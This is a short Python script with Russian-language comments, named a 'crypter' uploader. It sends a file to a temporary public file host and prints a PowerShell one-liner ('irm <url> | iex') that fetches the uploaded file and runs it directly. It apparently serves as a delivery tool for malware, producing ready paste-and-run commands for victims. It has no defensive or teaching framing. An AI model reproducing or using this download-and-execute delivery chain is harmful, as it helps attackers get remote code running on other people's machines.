#!/usr/bin/env python3
"""
crypter File Uploader
Загружает файл на crypter и генерирует PowerShell команду для скачивания.
"""

import sys
import requests
from pathlib import Path


def upload_to_crypter(file_path):
    """Загружает файл на crypter"""
    url = "https://litterbox.catbox.moe/resources/internals/api.php"
    
    with open(file_path, 'rb') as f:
        files = {'fileToUpload': f}
        data = {'reqtype': 'fileupload'}
        
        print(f"Загрузка {Path(file_path).name} на crypter...")
        response = requests.post(url, data=data, files=files)
        
    if response.status_code == 200:
        return response.text.strip()
    else:
        raise Exception(f"Ошибка загрузки: {response.status_code}")


def main():
    if len(sys.argv) < 2:
        print("Использование: python uploader.py <путь_к_файлу>")
        print("Или перетащи файл на uploader.py")
        input("Нажми Enter для выхода...")
        return
    
    file_path = sys.argv[1]
    
    if not Path(file_path).exists():
        print(f"Файл не найден: {file_path}")
        input("Нажми Enter для выхода...")
        return
    
    try:
        file_url = upload_to_crypter(file_path)
        
        print(f"\n✅ Файл загружен!")
        print(f"URL: {file_url}")
        print(f"\n{'='*60}")
        print("PowerShell команда для скачивания и выполнения:")
        print(f"{'='*60}")
        print(f"\nirm {file_url} | iex\n")
        print(f"{'='*60}")
        
    except Exception as e:
        print(f"\n❌ Ошибка: {e}")
    
    input("\nНажми Enter для выхода...")


if __name__ == "__main__":
    main()
